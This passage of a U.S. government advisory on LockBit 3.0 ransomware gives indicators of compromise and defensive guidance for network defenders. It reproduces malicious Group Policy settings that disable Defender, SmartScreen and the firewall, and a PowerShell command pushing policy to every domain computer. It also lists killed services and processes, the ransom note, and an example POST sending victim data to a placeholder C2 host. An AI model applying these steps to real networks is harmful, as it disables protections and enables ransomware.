startupType\\=\"DISABLED\" serviceName\\=\"SQLTELEMETRY\" serviceAction\\=\"STOP\" timeout\\=\"30\"/\\>    \\</NTService\\>    \\<NTService clsid\\=\"{AB6F0B67\\-341F\\-4e51\\-92F9\\-005FBFBA1A43}\"    name\\=\"MSSQLSERVER\" image\\=\"4\" changed\\=\"%s\" uid\\=\"%s\" disabled\\=\"0\"\\>    \\<Properties startupType\\=\"DISABLED\" serviceName\\=\"MSSQLSERVER\" serviceAction\\=\"STOP\" timeout\\=\"60\"/\\>    \\</NTService\\>    \\</NTServices\\> |\n\n\n###### Registry.pol\n\n\n\n The following registry configuration changes values for the Group Policy refresh time, disable SmartScreen, and disable Windows Defender.\n \n\n\n\n\n| Registry Key | Registry Value | Value type | Data |\n| --- | --- | --- | --- |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s\\\\System | GroupPolicyRefresh TimeDC | REG\\_D WORD | 1 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s\\\\System | GroupPolicyRefresh TimeOffsetDC | REG\\_D WORD | 1 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s\\\\System | GroupPolicyRefresh Time | REG\\_D WORD | 1 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s\\\\System | GroupPolicyRefresh TimeOffset | REG\\_D WORD | 1 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s\\\\System | EnableSmartScreen | REG\\_D WORD | 0 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s\\\\System | \\*\\*del.ShellSmartSc reenLevel | REG\\_S Z |  |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s Defender | DisableAntiSpyware | REG\\_D WORD | 1 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s Defender | DisableRoutinelyTa kingAction | REG\\_D WORD | 1 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s Defender\\\\Real\\-Time Protection | DisableRealtimeMon itoring | REG\\_D WORD | 1 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s Defender\\\\Real\\-Time Protection | DisableBehaviorMon itoring | REG\\_D WORD | 1 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s Defender\\\\Spynet | SubmitSamplesConse nt | REG\\_D WORD | 2 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window s Defender\\\\Spynet | SpynetReporting | REG\\_D WORD | 0 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window sFirewall\\\\DomainProfile | EnableFirewall | REG\\_D WORD | 0 |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Window sFirewall\\\\StandardProfile | EnableFirewall | REG\\_D WORD | 0 |\n\n\n###### Force GPUpdate\n\n\n\n Once new group policies are added, a PowerShell command using Group Policy update (GPUpdate) applies the new group policy changes to all computers on the AD domain.\n \n\n\n\n\n| Force GPUpdate Powershell Command |\n| --- |\n| powershell Get\\-ADComputer \\-filter \\* \\-Searchbase '%s' \\| Foreach\\-Object { Invoke\\- GPUpdate \\-computer $\\_.name \\-force \\-RandomDelayInMinutes 0} |\n\n\n###### Services Killed\n\n\n\n\n| vss | sql | svc$ |\n| --- | --- | --- |\n| memtas | mepocs | msexchange |\n| sophos | veeam | backup |\n| GxVss | GxBlr | GxFWD |\n| GxCVD | GxCIMgr |  |\n\n\n###### Processes Killed\n\n\n\n\n| sql | oracle | ocssd |\n| --- | --- | --- |\n| dbsnmp | synctime | agntsvc |\n| isqlplussvc | xfssvccon | mydesktopservice |\n| ocautoupds | encsvc | firefox |\n| tbirdconfig | mydesktopqos | ocomm |\n| dbeng50 | sqbcoreservice | excel |\n| infopath | msaccess | mspu |\n| onenote | outlook | powerpnt |\n| steam | thebat | thunderbird |\n| visio | winword | wordpad |\n| notepad |  |  |\n\n\n###### LockBit 3\\.0 Ransom Note\n\n\n\n> \\~\\~\\~ LockBit 3\\.0 the world's fastest and most stable ransomware from 2019\\~\\~\\~\n>    \n> \n>  \\>\\>\\>\\>\\> Your data is stolen and encrypted.\n>    \n> \n>  If you don't pay the ransom, the data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe.\n\n\n###### Network Connections\n\n\n\n If configured, Lockbit 3\\.0 will send two HTTP POST requests to one of the C2servers. Information about the victim host and bot are encrypted with an Advanced Encryption Standard (AES) key and encoded in Base64\\.\n \n\n\n\n\n| Example of HTTP POST request POST  **\\<Lockbit C2\\>**   /?7F6Da\\=u5a0TdP0\\&Aojq\\=\\&NtN1W\\=OuoaovMvrVJSmPNaA5\\&fckp9\\=FCYyT6b7kdyeEXywS8I8 HTTP/1\\.1 Accept: \\*/\\* Accept\\-Encoding: gzip, deflate, br Content\\-Type: text/plain User\\-Agent: Safari/537\\.36  **\\<Lockbit User Agent String\\>**   Host:  **\\<Lockbit C2\\>**   Connection: Keep\\-Alive LIWy\\=RJ51lB5GM\\&a4OuN\\=  ***\\<Lockbit ID\\>***  \\&LoSyE3\\=8SZ1hdlhzld4\\&DHnd99T\\=rTx9xGlInO6X0zWW\\&2D6\\=Bokz\\&T1guL\\=MtRZsFCRMKyBmfmqI\\& 6SF3g\\=JPDt9lfJIQ\\&wQadZP\\=  ***\\<Base64 encrypted data\\>***  Xni\\=AboZOXwUw\\&2rQnM4\\=94L\\&0b\\=ZfKv7c\\&NO1d\\=M2kJlyus\\&AgbDTb\\=xwSpba\\&8sr\\=EndL4n0HVZjxPR\\& m4ZhTTH\\=sBVnPY\\&xZDiygN\\=cU1pAwKEztU\\&\\=5q55aFIAfTVQWTEm\\&4sXwVWcyhy\\=l68FrIdBESIvfCkvYl Example of information found in encrypted data { \"bot\\_version\":\"X\", \"bot\\_id\":\"X\", \"bot\\_company\":\"X\", \"host\\_hostname\":\"X\", \"host\\_user\":\"X\", \"host\\_os\":\"X\", \"host\\_domain\":\"X\", \"host\\_arch\":\"X\", \"host\\_lang\":\"X\", \"disks\\_info\":\\[ { \"disk\\_name\":\"X\", \"disk\\_size\":\"XXXX\", \"free\\_size\":\"XXXXX\" } |\n| --- |\n\n\n###### User Agent Strings\n\n\n\n\n| Mozilla/5\\.0 (Windows NT    6\\.1\\) | AppleWebKit/587\\.38    (KHTML, like Gecko) | Chrome/91\\.0\\.4472\\.77 |\n| --- | --- | --- |\n| Safari/537\\.36 | Edge/91\\.0\\.864\\.37 | Firefox/89\\.0 |\n| Gecko/20100101 |  |  |\n\n\n#### **MITRE ATT\\&CK TECHNIQUES**\n\n\n\n See Table 3 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping to the MITRE ATT\\&CK framework, see CISA\u2019s\n [Decider Tool](https://www.cisa.gov/news-events/alerts/2023/03/01/cisa-releases-decider-tool-help-mitre-attck-mapping) \n and\n [Best Practices for MITRE ATT\\&CK Mapping Guide](https://www.cisa.gov/news-events/alerts/2023/01/17/cisa-updates-best-practices-mapping-mitre-attckr) \n .\n \n\n\n\n\n\n*Table 3: LockBit 3\\.0 Actors ATT\\&CK Techniques for Enterprise* \n\n| Initial Access |  |  |\n| --- | --- | --- |\n| Technique Title | ID | Use |\n| **Execution** |  |  |\n| Technique Title | ID | Use |\n| **Persistence** |  |  |\n| Technique Title | ID | Use |\n| **Privilege Escalation** |  |  |\n| Technique Title | ID | Use |\n| **Defense Evasion** |  |  |\n| Technique Title | ID | Use |\n| **Credential Access** |  |  |\n| Technique Title | ID | Use |\n| **Discovery** |  |  |\n| Technique Title | ID | Use |\n| **Lateral Movement** |  |  |\n| Technique Title | ID | Use |\n| **Command and Control** |  |  |\n| Technique Title | ID | Use |\n| **Exfiltration** |  |  |\n| Technique Title | ID | Use |\n| **Impact** |  |  |\n| Technique Title | ID | Use |\n| Valid Accounts | [T1078](https://attack.mitre.org/versions/v12/techniques/T1078/) | LockBit 3\\.0 actors obtain and abuse credentials of existing accounts as a means of gaining initial access. |\n| Exploit External Remote Services | [T1133](https://attack.mitre.org/versions/v12/techniques/T1133/) | LockBit 3\\.0 actors exploit RDP to gain access to victim networks. |\n| Drive\\-by Compromise | [T1189](https://attack.mitre.org/versions/v12/techniques/T1189/) | LockBit 3\\.0 actors gain access to a system through a user visiting a website over the normal course of browsing. |\n| Exploit Public\\-Facing Application | [T1190](https://attack.mitre.org/versions/v12/techniques/T1190/) | LockBit 3\\.0 actors exploit vulnerabilities in internet\\-facing systems to gain access to victims\u2019 systems. |\n| Phishing | [T1566](https://attack.mitre.org/versions/v12/techniques/T1566/) | LockBit 3\\.0 actors use phishing and spearphishing to gain access to victims' networks. |\n| Execution | [TA0002](https://attack.mitre.org/versions/v12/tactics/TA0002/) | LockBit 3\\.0 launches commands during its execution. |\n| Software Deployment Tools | [T1072](https://attack.mitre.org/versions/v12/techniques/T1072/) | LockBit 3\\.0 uses Chocolatey, a command\\- line package manager for Windows. |\n| Valid Accounts | [T1078](https://attack.mitre.org/versions/v12/techniques/T1078/) | LockBit 3\\.0 uses a compromised user account to maintain persistence on the target network. |\n| Boot or Logo Autostart Execution | [T1547](https://attack.mitre.org/versions/v12/techniques/T1547/) | LockBit 3\\.0 enables automatic logon for persistence. |\n| Privilege Escalation | [TA0004](https://attack.mitre.org/versions/v12/tactics/TA0004/) | Lockbit 3\\.0 will attempt to escalate to the required privileges if current account privileges are insufficient. |\n| Boot or Logo Autostart Execution | [T1547](https://attack.mitre.org/versions/v12/techniques/T1547/) | LockBit 3\\.0 enables automatic logon for privilege escalation. |\n| Obfuscated Files or Information | [T1027](https://attack.mitre.org/versions/v12/techniques/T1027/) | LockBit 3\\.0 will send encrypted host and bot information to its C2 servers. |\n| Indicator Removal: File Deletion | [T1070\\.004](https://attack.mitre.org/versions/v12/techniques/T1070/004/) | LockBit 3\\.0 will delete itself from the disk. |\n| Execution\u00a0Guardrails: Environmental Keying | [T1480\\.001](https://attack.mitre.org/versions/v12/techniques/T1480/001/) | LockBit 3\\.0 will only decrypt the main component or continue to decrypt and/or decompress data if the correct password is entered. |\n| OS Credential Dumping: LSASS Memory | [T1003\\.001](https://attack.mitre.org/versions/v12/techniques/T1003/001/) | LockBit 3\\.0 uses Microsoft Sysinternals ProDump to dump the contents of LSASS.exe. |\n| Network Service Discovery | [T1046](https://attack.mitre.org/versions/v12/techniques/T1046/) | LockBit 3\\.0 uses SoftPerfect Network Scanner to scan target networks. |\n| System Information Discovery | [T1082](https://attack.mitre.org/versions/v12/techniques/T1082/) | LockBit 3\\.0 will enumerate system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices. |\n| System\u00a0Location\u00a0\u00a0 Discovery: System Language Discovery | [T1614\\.001](https://attack.mitre.org/versions/v12/techniques/T1614/001/) | LockBit 3\\.0 will not infect machines with language settings that match a defined exclusion list. |\n| Remote\u00a0Services:\u00a0\u00a0 Remote Desktop Protocol | [T1021\\.001](https://attack.mitre.org/versions/v12/techniques/T1021/001/) | LockBit 3\\.0 uses Splashtop remote\\- desktop software to facilitate lateral movement. |\n| Application Layer Protocol: File Transfer Protocols | [T1071\\.002](https://attack.mitre.org/versions/v12/techniques/T1071/002/) | LockBit 3\\.0 uses FileZilla for C2\\. |\n| Protocol Tunnel | [T1572](https://attack.mitre.org/versions/v12/techniques/T1572/) | LockBit 3\\.0 uses Plink to automate SSH actions on Windows. |\n| Exfiltration | [TA0010](https://attack.mitre.org/versions/v12/tactics/TA0010/) | LockBit 3\\.0 uses Stealbit, a custom exfiltration tool first used with LockBit 2\\.0, to steal data from a target network. |\n| Exfiltration Over Web Service | [T1567](https://attack.mitre.org/versions/v12/techniques/T1567/) | LockBit 3\\.0 uses publicly available file sharing services to exfiltrate a target\u2019s data. |\n| Exfiltration Over Web Service: Exfiltration to Cloud Storage | [T1567\\.002](https://attack.mitre.org/versions/v12/techniques/T1567/002/) | LockBit 3\\.0 actors use (1\\) rclone, an open source command line cloud storage manager to exfiltrate and (2\\) MEGA, a publicly available file sharing service for data exfiltration. |\n| Data Destruction | [T1485](https://attack.mitre.org/versions/v12/techniques/T1485/) | LockBit 3\\.0 deletes log files and empties the recycle bin. |\n| Data Encrypted for Impact | [T1486](https://attack.mitre.org/versions/v12/techniques/T1486/) | LockBit 3\\.0 encrypts data on target systems to interrupt availability to system and network resources. |\n| Service Stop | [T1489](https://attack.mitre.org/versions/v12/techniques/T1489/) | LockBit 3\\.0 terminates processes and services. |\n| Inhibit System Recovery | [T1490](https://attack.mitre.org/versions/v12/techniques/T1490/) | LockBit 3\\.0 deletes volume shadow copies residing on disk. |\n| Defacement: Internal Defacement | [T1491\\.001](https://attack.mitre.org/versions/v12/techniques/T1491/001/) | LockBit 3\\.0 changes the host system\u2019s wallpaper and icons to the LockBit 3\\.0 wallpaper and icons, respectively. |\n\n\n#### **MITIGATIONS**\n\n\n\n The FBI, CISA, and the MS\\-ISAC recommend organizations implement the mitigations below to improve your organization\u2019s cybersecurity posture on the basis of LockBit 3\\.0\u2019s activity. These mitigations align with the Cross\\-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful TTPs. Visit CISA\u2019s\n [Cross\\-Sector Cybersecurity Performance Goals](https://www.cisa.gov/cpg) \n for more information on the CPGs, including additional recommended baseline protections.\n \n\n\n* **Implement a recovery plan** \n to maintain and retain multiple copies of sensitive or proprietary data and servers \\[\n [CPG 7\\.3](https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf) \n ] in a physically separate, segmented, and secure location (e.g., hard drive, storage device, the cloud).\n* **Require all accounts** \n with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with\n [National Institute for Standards and Technology (NIST) standards](https://pages.nist.gov/800-63-3/) \n for developing and managing password policies \\[\n [CPG 3\\.4](https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf) \n ].\n\t+ Use longer passwords consisting of at least 8 characters and no more than 64 characters in length \\[\n\t [CPG 1\\.4](https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf) \n\t ]\n\t+ Store passwords in hashed format using industry\\-recognized password managers\n\t+ Add password user \u201csalts\u201d to shared login credentials\n\t+ Avoid reusing passwords\n\t+ Implement multiple failed login attempt account lockouts \\[\n\t [CPG 1\\.1](https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf) \n\t ]\n\t+ Disable password \u201chints\u201d\n\t+ Refrain from requiring password changes more frequently than once per year.\n\t **Note:** \n\t NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password \u201cpatterns\u201d cyber criminals can easily decipher.\n\t+ Require administrator credentials to install software\n* **Require phishing\\-resistant multifactor authentication** \n \\[\n [CPG 1\\.3](https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf) \n ] for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.\n* **Keep all operating systems, software, and firmware up to date.** \n Timely patching is one of the most efficient and cost\\-effective steps an organization can take to minimize its exposure to cybersecurity threats.\n* **Segment networks** \n \\[\n [CPG 8\\.1](https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf) \n ] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between\u2014and access to\u2014various subnetworks and by restricting adversary lateral movement.\n* **Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool.** \n To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network \\[\n [CPG 5\\.1](https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf) \n ]. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.\n* **Install, regularly update, and enable real time detection for antivirus software** \n on all hosts.\n* **Review domain controllers, servers, workstations, and active directories** \n for new and/or unrecognized accounts.\n* **Audit user accounts** \n with administrative privileges and configure access controls according to the principle of least privilege \\[\n [CPG 1\\.5](https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf) \n ].\n* **Disable unused ports.**\n* **Consider adding an email banner to emails** \n \\[\n [CPG 8\\.3](https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf) \n ] received from outside your organization.\n* **Disable hyperlinks** \n in received emails.\n* **Implement time\\-based access for accounts set at the admin level and higher.** \n For example, the Just\\-in\\-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network\\-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.\n* **Disable command\\-line and scripting activities and permissions.** \n Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.\n* **Maintain offline backups of data,** \n and regularly maintain backup and restoration \\[\n [CPG 7\\.3](https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf) \n ]. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.\n* **Ensure all backup data is encrypted, immutable** \n (i.e., cannot be altered or deleted), and covers the entire organization\u2019s data infrastructure \\[\n [CPG 3\\.3](https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf) \n ].\n\n\n#### **VALIDATE SECURITY CONTROLS**\n\n\n\n In addition to applying mitigations, the FBI, CISA, and the MS\\-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT\\&CK for Enterprise framework in this advisory. The FBI, CISA, and the MS\\-ISAC authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT\\&CK techniques described in this advisory.\n   \n\n To get started:\n \n\n\n1. Select an ATT\\&CK technique described in this advisory (see Table 3\\).\n2. Align your security technologies against the technique.\n3. Test your technologies against the technique.\n4. Analyze your detection and prevention technologies performance.\n5. Repeat the process for all security technologies to obtain a set of comprehensive performance data.\n6. Tune your security program, including people, processes, and technologies, based on the data generated by this process.\n\n\n\n The FBI, CISA, and the MS\\-ISAC recommend continually testing your security program at scale and in a production environment to ensure optimal performance against the MITRE ATT\\&CK techniques identified in this advisory.\n \n\n\n#### **RESOURCES**\n\n\n* [Stopransomware.gov](https://www.stopransomware.gov/) \n is a whole\\-of\\-government approach that gives one central location for ransomware resources and alerts.\n* Resource to mitigate a ransomware attack:\n [CISA\\-Multi\\-State Information Sharing and Analysis Center (MS\\-ISAC) Joint Ransomware Guide](https://www.cisa.gov/sites/default/files/publications/CISA_MS-ISAC_Ransomware%20Guide_S508C.pdf) \n .\n* No\\-cost cyber hygiene services:\n [Cyber Hygiene Services](https://www.cisa.gov/cyber-hygiene-services) \n and\n [Ransomware Readiness Assessment](https://github.com/cisagov/cset/releases/tag/v10.3.0.0) \n .\n\n\n#### **REPORTING**\n\n\n\n The FBI is seeking any information that can be legally shared, including:\n \n\n\n* Boundary logs showing communication to and from foreign IP addresses\n* Sample ransom note\n* Communications with LockBit 3\\.0 actors\n* Bitcoin wallet information\n* Decryptor files\n* Benign sample of an encrypted file\n\n\n\n The FBI, CISA, and MS\\-ISAC do not encourage paying ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a\n [local FBI Field Office](https://www.fbi.gov/contact-us/field-offices) \n or CISA at\n [report@cisa.gov](mailto:report@cisa.gov) \n . State, local, tribal, and territorial (SLTT) government entities can also report to the MS\\-ISAC (\n [SOC@cisecurity.org](mailto:SOC@cisecurity.org) \n or 866\\-787\\-4722\\).\n \n\n\n#### **DISCLAIMER**\n\n\n\n The information in this report is being provided \u201cas is\u201d for informational purposes only. The FBI, CISA, and the MS\\-ISAC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI, CISA, or the MS\\-ISAC.\n \n\n\n\n Your feedback is important. Please take a few minutes to share your opinions on this product through an anonymous\n [Product Feedback Survey](https://www.surveymonkey.com/r/CISA-cyber-survey?product=%5bproduct_value%5d) \n .\n \n\n\n\n\n\n\n\n\n\n\n This product is provided subject to this\n [Notification](/notification \"Follow link\") \n and this\n [Privacy \\& Use](/privacy-policy \"Follow link\") \n policy.\n \n\n\n\n\n\n\n\n\n\n\nAdvisory Materials\n------------------\n\n\n\n\n\n[\\#StopRansomware: Lockbit](/sites/default/files/2023-03/aa23-075a-stop-ransomware-lockbit.pdf) \n\n (PDF, 688\\.70 KB\n )\n \n\n\n\n\n\n\n\n\n### Tags\n\n\n\n\n Topics\n \n\n[Malware, Phishing, and Ransomware](/topics/cyber-threats-and-advisories/malware-phishing-and-ransomware) \n ,\n [Cyber Threats and Advisories](/topics/cyber-threats-and-advisories) \n\n\n\n\n MITRE ATT\\&CK TTP\n \n\n Execution (TA0002\\), Exfiltration (TA0010\\), Privilege Escalation (TA0004\\), Command and Control (TA0011\\), Credential Access (TA0006\\), Defense Evasion (TA0005\\), Discovery (TA0007\\), Impact (TA0040\\), Initial Access (TA0001\\), Lateral Movement (TA0008\\), Persistence (TA0003\\)\n \n\n\n\n Co\\-Sealers and Partners\n \n\n Federal Bureau of Investigation, Multi\\-State Information Sharing and Analysis Center\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlease share your thoughts\n--------------------------\n\n\n\n We recently updated our anonymous\n [product survey](https://www.surveymonkey.com/r/CISA-cyber-survey?product=https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) \n ; we\u2019d welcome your feedback.\n \n\n\n\n\n\n\n\n\n\n\n\n\nRelated Advisories\n------------------\n\n\n\n\n\n\n\n\n\n\n Jul 11, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-193A\n \n\n### [CISA Red Team\u2019s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense\\-in\\-Depth](/news-events/cybersecurity-advisories/aa24-193a)\n\n\n\n\n\n\n\n\n\n\n\n Jul 08, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-190A\n \n\n### [People\u2019s Republic of China (PRC) Ministry of State Security APT40 Tradecraft in Action](/news-events/cybersecurity-advisories/aa24-190a)\n\n\n\n\n\n\n\n\n\n\n\n May 10, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-131A\n \n\n### [\\#StopRansomware: Black Basta](/news-events/cybersecurity-advisories/aa24-131a)\n\n\n\n\n\n\n\n\n\n\n\n Apr 18, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-109A\n \n\n### [\\#StopRansomware: Akira Ransomware](/news-events/cybersecurity-advisories/aa24-109a)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Return to top](#) \n\n\n\n\n* [Topics](/topics)\n* [Spotlight](/spotlight)\n* [Resources \\& Tools](/resources-tools)\n* [News \\& Events](/news-events)\n* [Careers](/careers)\n* [About](/about)\n\n\n\n\n\n\n\n\n[Cybersecurity \\& Infrastructure Security Agency](/ \"Go to the Cybersecurity & Infrastructure Security Agency homepage\")\n\n\n* [Facebook](https://www.facebook.com/CISA)\n* [Twitter](https://twitter.com/CISAgov)\n* [LinkedIn](https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency)\n* [YouTube](https://www.youtube.com/@cisagov)\n* [Instagram](https://www.instagram.com/cisagov)\n* [RSS](/subscribe-updates-cisa)\n\n\n\n\n CISA Central\n \n[1\\-844\\-Say\\-CISA](tel:1-844-Say-CISA) \n[SayCISA@cisa.gov](mailto:SayCISA@cisa.gov) \n\n\n\n\n\n\n\n\n\n\n\n DHS Seal\n \n\n\n CISA.gov\n \n\n An official website of the U.S. Department of Homeland Security\n \n\n\n* [About CISA](/about \"About CISA\")\n* [Budget and Performance](https://www.dhs.gov/performance-financial-reports \"Budget and Performance\")\n* [DHS.gov](https://www.dhs.gov \"Department of Homeland Security\")\n* [Equal Opportunity \\& Accessibility](/oedia \"Equal Opportunity & Accessibility\")\n* [FOIA Requests](https://www.dhs.gov/foia \"FOIA Requests\")\n* [No FEAR Act](/no-fear-act \"No FEAR Act Reporting\")\n* [Office of Inspector General](https://www.oig.dhs.gov/ \"Office of Inspector General\")\n* [Privacy Policy](/privacy-policy \"Privacy Policy\")\n* [Subscribe](https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138 \"Subscribe to Email Updates\")\n* [The White House](https://www.whitehouse.gov/ \"The White House\")\n* [USA.gov](https://www.usa.gov/ \"USA.gov\")\n* [Website Feedback](/forms/feedback \"Website Feedback\")\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", "cves": [], "techniques": ["T1614.001", "T1003.001", "T1021.001", "T1480.001", "T1491.001", "T1070.004", "T1567.002", "T1071.002"], "advisory": "aa23-075a", "title": "#StopRansomware: LockBit 3.0 | CISA", "source": "cybersecurity-advisories", "id": "36e4ed6427924c6ffb940dc37f5affad9cf4f668a40704d6c99f4d306289900c"}